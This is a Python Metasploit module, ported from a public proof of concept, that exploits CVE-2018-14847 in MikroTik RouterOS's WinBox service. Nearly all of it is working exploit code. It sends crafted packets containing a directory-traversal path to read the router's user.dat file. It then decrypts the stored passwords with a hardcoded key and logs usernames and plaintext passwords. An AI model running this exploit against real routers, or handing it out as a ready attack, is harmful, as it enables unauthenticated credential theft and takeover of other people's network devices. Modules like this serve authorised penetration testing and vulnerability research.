#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# standard modules
import logging

# extra modules
dependencies_missing = False
try:
    import socket
    import sys
    import hashlib
except ImportError:
    dependencies_missing = True

from metasploit import module

metadata = {
    'name': 'Mikrotik Winbox Arbitrary File Read',
    'description': '''
        MikroTik RouterOS (bugfix) 6.30.1-6.40.7, (current) 6.29-6.42, (RC) 6.29rc1-6.43rc3 allows unauthenticated
        remote attackers to read arbitrary files through a directory traversal through the WinBox interface
        (typically port 8291).''',
    'authors': [
        'mosajjal', # PoC
        'h00die' # msf port
    ],
    'date': '2018-08-02',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://github.com/BasuCert/WinboxPoC'},
        {'type': 'url', 'ref': 'https://blog.n0p.me/2018/05/2018-05-21-winbox-bug-dissection/'},
        {'type': 'url', 'ref': 'https://blog.mikrotik.com/security/winbox-vulnerability.html'},
        {'type': 'cve', 'ref': '2018-14847'},
        {'type': 'edb', 'ref': '45578'}
    ],
    'type': 'single_scanner',
    'options': {
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'rport': {'type': 'port', 'description': 'Target port', 'required': True, 'default': 8291},
    }
}

# direct port from @mosajjal's repo, extract_user.py, replacing prints with logging
def decrypt_password(user, pass_enc):
    key = hashlib.md5(user + b"283i4jfkai3389").digest()

    passw = ""
    for i in range(0, len(pass_enc)):
        passw += chr(pass_enc[i] ^ key[i % len(key)])
    return passw.split("\x00")[0]

def extract_user_pass_from_entry(entry):
    user_data = entry.split(b"\x01\x00\x00\x21")[1]
    pass_data = entry.split(b"\x11\x00\x00\x21")[1]

    user_len = user_data[0]
    pass_len = pass_data[0]

    username = user_data[1:1 + user_len]
    password = pass_data[1:1 + pass_len]

    return username, password

def get_pair(data):

    user_list = []

    entries = data.split(b"M2")[1:]
    for entry in entries:
        try:
            user, pass_encrypted = extract_user_pass_from_entry(entry)
        except:
            continue

        pass_plain = decrypt_password(user, pass_encrypted)
        user = user.decode("utf_8", "backslashreplace")

        user_list.append((user, pass_plain))

    return user_list

def dump(data):
    user_pass = get_pair(data)
    user_pass = set(user_pass) # unique it to avoid duplicates
    for u, p in user_pass:
        logging.info('Extracted Username: "{}" and password "{}"'.format(u,p))

# end of direct port

def run(args):
    module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
    if dependencies_missing:
        logging.error('Module dependency (requests) is missing, cannot continue')
        return

    # full file to pull
    file = b'/////./..//////./..//////./../flash/rw/store/user.dat'

    # hello packet, should get a session ID in response
    # also contains the request for the file
    # session IDs are integers, incremented
    a = [0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
         0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
         0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21]
    a += [len(file)]
    a += list(bytearray(file))
    a += [0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
         0x08, 0x00, 0x00, 0x00]
    a += [0x01, 0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00, 0x00,
         0x02, 0x00, 0x00, 0x00]

    # 2nd request to retrieve the file
    b = [0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
         0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
         0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
         0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
         0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
         0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
         0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
         0x00, 0x02, 0x00, 0x00, 0x00]

    #Initialize Socket
    s = socket.socket()
    s.settimeout(3)
    try:
        s.connect((args['rhost'], int(args['rport'])))
    except Exception as e:
        logging.error("Connection error: {}".format(e))
        return

    #Convert to bytearray for manipulation
    a = bytearray(a)
    b = bytearray(b)

    #Send hello and recieve the sesison id
    s.send(a)
    try:
        d = bytearray(s.recv(1024))
    except Exception as e:
        logging.error("Connection error: {}".format(e))
        return

    session_id = d[38]
    logging.info("Session ID: {}".format(session_id))
    #Replace the session id in template
    b[19] = session_id

    #Send the edited response
    logging.info("Requesting user database through exploit")
    s.send(b)
    d = bytearray(s.recv(1024))

    #Get results
    if len(d[55:]) > 25:
        logging.info('Exploit successful, attempting to extract usernames & passwords')
        dump(d[55:])
    else:
        logging.info('Exploit failed')


if __name__ == "__main__":
    module.run(metadata, run)
